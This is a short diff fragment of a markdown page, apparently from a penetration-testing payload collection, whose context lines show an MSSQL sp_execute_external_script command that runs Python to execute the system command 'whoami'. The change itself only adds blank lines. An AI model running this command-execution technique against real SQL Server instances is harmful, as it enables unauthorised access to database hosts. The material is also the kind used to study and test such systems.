@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:46.090384+00:00'
 ```bash
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
 ```
+
+
